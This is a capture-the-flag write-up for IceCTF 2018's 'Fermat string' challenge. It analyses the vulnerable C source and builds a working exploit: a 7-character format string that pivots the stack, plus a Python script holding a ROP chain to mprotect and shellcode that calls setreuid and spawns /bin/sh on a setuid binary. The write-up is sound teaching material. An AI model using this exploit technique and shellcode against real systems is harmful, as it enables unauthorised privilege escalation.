---
layout: post
title: IceCTF 2018 - Fermat string Writeup
author: madt1m
category: pwn
tags: pwn binary-exploitation writeup icectf
---

# Does size matter?

The challenge description gives us some hint about Format Strings attacks, and the ability to exploit their phenomenal powers...in a Itty-Bitty living space :) [..._a margin of paper_]

## Some Analysis
Which kind of beast are we facing? A run of `checksec` and `file`:

![AltText](/media/images/icectffermat_1.JPG)
![AltText](/media/images/icectffermat_2.JPG)

With PIE disabled, and the binary statically linked, we basically have
every address we desire carved in a stone. Running multiple times the binary in target machine, with gdb `set disable-randomization off`, also confirms that stack addresses are stable during different runs.

This time, we do have the source code to analyze. Let's take a look.
```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>


void welcome(void)
{
	char *user = getenv("USER");
	char buf[1000 + (user != NULL ? strlen(user) : 0)];
	memset (buf, 0, sizeof(buf));
	snprintf (buf, sizeof(buf), "Welcome to Fermat's Last Exploit, %s!", user);
	printf ("%s", buf); /* Careful */
}


void payload(char *input) {
    char buf[16];
    int i, cnt = -1;

    welcome();

    /* Make sure input isn't too long */
    if (strlen (input) > 7)
    {
    	fprintf (stderr, "Your payload is too large!\n");
    	return;
    }


    /* Ensure there aren't any rogue format string conversions in here */
    for (i = 0; i < strlen(input); i++)
    {
    	if (input[i] == '%')
		cnt++;
    }
    if (cnt > 0)
    {
    	fprintf (stderr, "No `%%' characters allowed!\n");
    	return;
    }

    memset (buf, 0, sizeof(buf));
    /* Avoid security problems by checking length, just in case */
    strncpy (buf, input, sizeof(buf)-1);
    printf (buf);
}



void dispatch(int argc, char **argv)
{
    if (argc > 1){
        payload (argv[1]);
    } else {
        printf("Usage: %s <payload>\n", argv[0]);
    }
}

int main(int argc, char **argv) {
    dispatch (argc, argv);

    return 0;
}
```

We can provide two kinds of inputs:
- `input`, which will be delivered as **argv[1]** via command line.
- `USER`, via environment variable.


### About `input`

```
int i, cnt = -1;
...
...
/* Ensure there aren't any rogue format string conversions in here */
    for (i = 0; i < strlen(input); i++)
    {
        if (input[i] == '%')
        cnt++;
    }
    if (cnt > 0)
    {
        fprintf (stderr, "No `%%' characters allowed!\n");
        return;
    }
```

It is clear that the protection mechanism will be triggered with at least two uses of '%' character. So we have only one format specifier to shoot.

```
/* Make sure input isn't too long */
    if (strlen (input) > 7)
    {
        fprintf (stderr, "Your payload is too large!\n");
        return;
    }
```
Here it is, our tiny margin of space. Length of the string cannot seemingly exceed 7 characters.

```
memset (buf, 0, sizeof(buf));
/* Avoid security problems by checking length, just in case */
strncpy (buf, input, sizeof(buf)-1);
printf (buf);
```
At last, a [format string](https://www.owasp.org/index.php/Format_string_attack) vulnerability!


### About `USER`

```
char buf[1000 + (user != NULL ? strlen(user) : 0)];
...
...
snprintf (buf, sizeof(buf), "Welcome to Fermat's Last Exploit, %s!", user);

```

The buffer grows together with the length of our env input. This means we can stretch it quite a lot :)


## Planning The Attack

NX enabled, PIE disabled, binary is statically linked. We have a way to write over memory (**format strings**) and a way to fill the stack with arbitrary input (**`USER` env variable copied in buf**). We have static address for pretty much everything.

I have a clear goal in mind:

1. Place in `USER` a payload composed of:
  - A ROPchain calling `mprotect()` to enable RWX permissions on a stack page;
  - A shellcode to `setreuid(1337, 1337)` & `execve("/bin/sh", NULL, NULL)`
2. Exploit the format string vulnerability to jump to my previously placed payload.

---------------------------------
#### _NOTE_

The reason I need `setreuid(1337, 1337)` lays in how Linux and bash handle permissions. `fermat` binary is owned by `target` user, with setuid bit enabled. This means that every user running the binary will run it with owner permissions, which we need to read the flag.

However, in our target machine, `/bin/sh` links to `/bin/bash`, and for security reasons the latter drops suid privileges when executed.

The solution to this is to call `setreuid()`, which sets our **real_id** to be equal to our current **effective_id**. Linux manual is there for more informations on the argument :)

----------------------------------

So, back to the business...I need a reliable way to start my ROPchain.

In technical words, this means that `ESP` register must point to the beginning of the fake stack I have injected via `USER` variable,
and `EIP` register must point to a `ret` instruction.

To keep things short, I'll explain here how I managed to obtain the above, together with the exploit. For your information, getting to that solution required a lot of trial and error, and searching thru the stack and text section with GDB.

### The Exploit

Let's see how to use our format string vulnerability.
This is a snapshot of memory layout when hitting the vulnerable `printf()`:

![AltText](/media/images/icectffermat_3.JPG)

Looking at output from `bt` and `stack` we can examine the how stack frames where formed.
We are in function `payload()`, and there on the stack we have:
- Saved EBP and Saved EIP (pointing to `dispatch + 40`) to restore `dispatch`;
- Saved EBP and Saved EIP (pointing to `main + 42`) to restore `main`;

We will use a _stack pivoting_ technique to make `ESP` point to our fake stack.

The idea is to overwrite Saved EBP in `dispatch` frame, at address `0xffffd5a8`, to point to our payload injected in `welcome()`.

How? We have 7 characters.

The following input: `%14$hn` writes 0 in the two bytes starting at the address pointed by the 14th word after the format string.

In practice:
- Looking back at the image, the 14th word after the format string is at address `0xffffd588`;
- This address points to `0xffffd5a8`;
- So, our format string will write 0x0 into `0xffffd5a8` and `0xffffd5a9`
- Previously, `0xffffd5a8` contained value `0xffffd5c8`;
- After `printf()`, it will contain value `0xffff0000`.

Now, remember the `welcome()` function? Thanks to that function, we can write a huge payload into memory, and buffer will grow (in stack, so towards lower addresses), so that we can make the area now written in Saved BP (`0xffff0000`) pointing to our payload.

Now I needed to find a way to write that value into `ESP` and trigger the ROPChain.

The trick to trigger stack pivoting is using the two `leave` instruction in `dispatch` and `main`:
- The first `leave` moves `ESP` to current `EBP`, then copies our overwritten SBP into `EBP`;
- The second `leave` moves `ESP` to current `EBP` - **which we injected in the previous frame** - then pops the SBP into EBP, but this doesn't matter since ESP points to our payload now :)

I slightly modified this approach because of these instructions in `main`:

![AltText](/media/images/icectffermat_4.JPG)

Following `leave`,
the value in memory pointed by `ecx - 4` is moved into `esp`. Luckily, we can control the content of `ecx`, since it is loaded in:
`mov ecx, DWORD PTR [ebp - 0x4]`, and `ebp` is already pointing to our fake stack.

The rest of the work has just been writing a ROPchain which didn't contain NULL bytes (that couldn't reside in `env`) -- but since the binary is statically linked, I have a whole load of ROP gadgets already linked to binary, found with `ropper` -- and carefully computing addresses inside and outside gdb. Here, the script to generate the payload, which I used in target machine with:

`USER=$(python exploit.py) ./fermat "%14\$hn"`

```
import struct

def p32(address):
  return struct.pack("I", address)

# To compute addresses to store args to mprotect
mprotect_base = 0xffff105c
# mprotect requires a page aligned boundary
stackpage_base = 0xffff1000
# setreuid(geteuid(), geteuid()) && execve("/bin//sh", NULL, NULL)
shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"


movdpedx = 0x08055a2b # mov dword ptr [edx], eax; ret
xoreax = 0x08049743 # xor eax, eax; ret
inceax = 0x0807f1bf # inc eax; ret
popedx = 0x08073bda # pop edx; ret
popeax = 0x080bd026 # pop eax; ret
mprotect = 0x8072c50 # address to mprotect

# The ropchain computes args to mprotect and pushes them
# to the right address in fake stack, which is after mprotect_base.
# mprotect_base is a value I have computed by trial, looking
# at where, after payload injection, mprotect address was loaded
# into fake stack.

ropchain = p32(popedx) + p32(mprotect_base + 4) + p32(popeax)
ropchain += p32(stackpage_base - 1) + p32(inceax) + p32(movdpedx)
ropchain += p32(popedx) + p32(mprotect_base + 8) + p32(xoreax)
ropchain += p32(inceax) + p32(movdpedx) + p32(popedx) + p32(mprotect_base + 12)
ropchain += p32(xoreax) + p32(inceax)*7 + p32(movdpedx) + p32(mprotect)
# mprotect_base + 16 points to the shellcode; we need to ret to it.
# BBBB*3 will be overwritten at runtime by movdpedx gadgets.
ropchain += p32(mprotect_base + 16) + "BBBB"*3


payload = "A"*6394  # Distance between 0xffff0000 - 0x4 and start of USER
payload += p32(0xffff1004) # address to load into esp + 0x4
payload += 'A'*4096 # JUNK
payload += ropchain
payload += shellcode
payload += 'A'*(30000 - len(payload)) # just because I used 30k to compute addresses and experiment.
print(payload)
```



IceCTF{s1ze_matt3rs_n0t}
